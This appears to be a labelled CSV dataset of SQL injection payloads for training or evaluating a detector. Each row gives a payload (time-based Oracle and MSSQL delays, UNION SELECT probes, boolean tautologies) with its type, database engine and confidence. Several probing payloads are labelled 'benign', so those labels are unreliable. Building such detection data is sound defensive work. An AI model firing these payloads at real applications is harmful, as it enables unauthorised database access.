id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20829,"1"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""diiv"" = ""diiv",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20941,"1%"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20943,"1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20949,"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20810,1 ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
20816,-6015%' ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
20840,1%' ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
20866,"1%"" ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20869,-8264%' ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
20887,"1,iif ( 7475 = 7475,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 27 chars.,2
20897,"1' ) where 1225 = 1225 and elt ( 8831 = 7779,7779 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
20902,"1'|| ( select 'pygt' from dual where 5543 = 5543 union all select null,null,null,null,null,null#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
20927,"1 ) where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
20959,-1217' ) ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 24 chars.,2
20960,"iif ( 2205 = 4764,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
20805,"-1079"" ) where 2865 = 2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
20808,"-1894' ) union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
20809,1%' ) ) ) union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
20814,"-9451"" ) ) ) union all select 4211,4211,4211,4211,4211,4211,4211--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
20819,"1"" where 1852 = 1852 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
20832,"1 ) ) as hpxw where 1826 = 1826 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
20833,"1%"" ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
20837,-3666' ) where 6386 = 6386 union all select 6386--,union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
20843,"-5959"" or 2477 = 1144",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
20845,"-6377'|| ( select 'ryin' where 2113 = 2113 union all select 2113,2113,2113#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
20847,"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20853,"1 ) as ujjg where 3125 = 3125 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
20856,"1%"" ) and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
20865,"-4866"" ) as eyrq where 8365 = 8365 or 1898 = 8320#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
20883,-4617' ) ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
20888,"-7564' ) as nank where 8095 = 8095 union all select 8095,8095,8095--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
20890,"1"" ) as doai where 7024 = 7024 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
20892,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
20893,"-2254' ) as dyrv where 9079 = 9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,2
20895,"1%"" ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
20896,"1"" and 9468 = 7105--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
20903,"1 ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
20904,"1'+ ( select 'pgje' where 4658 = 4658 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 105 chars.,2
20913,"1"" ) ) ) and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
20914,"1"" ) ) as tngu where 3644 = 3644 union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
20916,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
20917,"1"" ) where 6367 = 6367 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
20925,"1%"" ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
20926,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
20928,"-5924' where 5415 = 5415 union all select 5415,5415,5415,5415,5415,5415#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
20934,"1'+ ( select 'fxhh' where 2571 = 2571 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 91 chars.,2
20938,"1%"" ) ) and 1083 = 6202",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
20939,"-5731"" union all select 3083,3083,3083#",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
20942,1' where 9816 = 9816 and 7533 = 7533--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
20947,"-9932"" union all select 4049,4049,4049--",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
20950,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
20955,"-1174"" union all select 4303,4303,4303,4303#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
20961,"1"" union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20963,"-5148"" ) ) or 5310 = 8229",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
20965,1 ) ) ) and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
